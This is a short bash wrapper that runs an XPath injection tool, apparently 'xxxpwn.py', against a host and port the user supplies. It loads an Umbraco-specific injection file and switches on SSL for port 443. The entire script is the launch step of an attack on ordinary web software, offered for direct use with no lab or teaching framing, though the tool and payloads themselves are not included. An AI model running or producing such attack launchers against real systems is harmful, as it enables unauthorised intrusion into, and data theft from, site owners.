#!/bin/bash

HOST=${1-"localhost"}
PORT=${2-"80"}
USESSL=''
if [ $# -lt 1 ]; then echo "$0 [HOST] {PORT}"; exit 1; fi
if (( $PORT==443 )); then USESSL="--ssl"; fi

python xxxpwn.py $USESSL -gnox -U -t2 -i inject_umbraco.txt -m "test" $HOST $PORT


